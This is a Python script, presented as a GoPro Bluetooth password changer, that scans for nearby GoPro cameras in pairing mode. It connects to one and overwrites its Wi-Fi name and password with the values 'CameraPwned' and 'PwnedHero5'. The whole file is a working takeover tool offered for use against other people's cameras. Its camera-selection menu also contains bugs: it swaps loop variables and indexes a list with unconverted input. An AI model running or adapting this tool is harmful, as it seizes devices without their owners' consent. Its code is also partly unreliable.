from bluetooth.ble import DiscoveryService
import gatt
import time
import urllib.request
import subprocess

print("GoPro Bluetooth Password Changer 1.0")
print("Put GoPro in Pairing mode!")

def discover_camera():
    cameras=[]
    service = DiscoveryService()
    devices = service.discover(2)
    for address, name in devices.items():
        if name.startswith("GoPro"):
            cameras.append([name,address])
    if len(cameras) == 0:
        print("No cameras detected.")
        exit()
    if len(cameras) == 1:
        return cameras[0][1]
    for i, index in enumerate(cameras):
        print("[{}] {} - {}".format(index, i[0], i[1]))
    return cameras[input("ENTER BT GoPro ADDR: ")][1]

mac_address=discover_camera()

manager = gatt.DeviceManager(adapter_name='hci0')
class AnyDevice(gatt.Device):

    def connect_succeeded(self):
        super().connect_succeeded()
        print("[%s] Connected" % (self.mac_address))

    def services_resolved(self):
        super().services_resolved()  
        wifi_info_service = next(
            s for s in self.services
            if s.uuid == "b5f90001-aa8d-11e3-9046-0002a5d5c51b")
        for i in wifi_info_service.characteristics:
            print(i.uuid)
            if i.uuid == "b5f90003-aa8d-11e3-9046-0002a5d5c51b":
            	i.write_value(bytearray(b"CameraPwned"))
            if i.uuid == "b5f90002-aa8d-11e3-9046-0002a5d5c51b":
            	i.write_value(bytearray(b"PwnedHero5"))  
        pass
        
    def characteristic_write_value_succeeded(self, characteristic):
    	characteristic.read_value()
    	print(">>>")
    def characteristic_value_updated(self, characteristic, value):
    	print("[recv] {}".format(characteristic.uuid))
    	if value.decode("utf-8") == "PwnedHero5" or value.decode("utf-8") == "CameraPwned":
    		print("...")
    	if characteristic.uuid == "b5f90003-aa8d-11e3-9046-0002a5d5c51b":
    		characteristic.write_value(bytearray(b"CameraPwned"))
    		print(">>>")
    	if characteristic.uuid == "b5f90002-aa8d-11e3-9046-0002a5d5c51b":
    		characteristic.write_value(bytearray(b"PwnedHero5"))  
    		print(">>>")
device = AnyDevice(mac_address=mac_address, manager=manager)
device.connect()
manager.run()

